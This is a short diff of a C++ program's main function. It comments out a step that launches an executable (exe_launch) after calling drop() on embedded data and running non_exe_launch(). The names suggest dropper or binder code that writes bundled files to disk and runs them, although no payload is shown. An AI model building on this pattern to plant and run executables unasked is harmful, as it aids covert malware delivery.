@@ -148,12 +148,12 @@ int main(int argc, char* argv[])
 		drop(size3, data3, name3);
 
 		bool result = non_exe_launch(name3);
-
-		if (result == true){
-			exe_launch(name2);
-		} else {
-			std::cout << "This failed and nothing happened.\n";
-		}
+//
+//		if (result == true){
+//			exe_launch(name2);
+//		} else {
+//			std::cout << "This failed and nothing happened.\n";
+//		}
 
 ////////////////////////////////////////////
 
